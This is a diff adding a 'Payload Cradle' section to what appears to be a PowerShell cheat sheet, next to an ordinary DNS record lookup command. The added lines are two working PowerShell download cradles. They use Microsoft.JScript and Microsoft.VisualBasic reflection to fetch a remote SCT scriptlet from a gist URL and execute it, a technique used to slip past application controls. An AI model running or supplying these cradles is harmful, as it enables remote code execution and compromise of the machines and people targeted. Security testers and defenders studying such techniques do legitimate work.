@@ -1,3 +1,18 @@
+
+Payload Cradle
+---------------
+SCT Launch Execution Reflection.Assembly Via ( Microsoft.JScript )
+
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetO
+bject("script:https://gist.githubusercontent.com/SeemantBisht/043cd13e0efef9a4b9e4f24272669d4a/raw/61444755ce35af70323174c7acd93e343
+764b818/note_spawn.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+
+SCT Launch Execution Reflection.Assembly Via ( Microsoft.VisualBasic )
+
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://gist.githubusercontent.com/SeemantBisht/043cd13e0efef9a4b9e4f24272669d4a/raw/61444755ce35af70323174c7acd93e343764b818/note_spawn.sct').Exec(0)
+
+
+
 DNS Records
 ---------------------
 Get-DnsRecord -RecordType A -ZoneName FQDN -Server ServerName
